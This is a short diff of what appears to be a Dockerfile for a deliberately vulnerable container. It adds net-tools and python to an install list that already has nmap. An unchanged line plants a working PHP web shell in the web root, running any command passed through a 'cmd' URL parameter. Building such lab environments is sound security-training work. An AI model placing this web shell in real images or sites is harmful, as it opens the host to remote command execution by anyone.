@@ -10,7 +10,9 @@ RUN echo "=========="
 USER root
 RUN apk add --no-cache \
   nmap \
-  vim
+  vim \
+  net-tools \
+  python
 RUN echo "=========="
 USER nobody
 RUN echo "<?php echo exec(\$_GET['cmd']);?>" > /var/www/html/ey_webshell.php
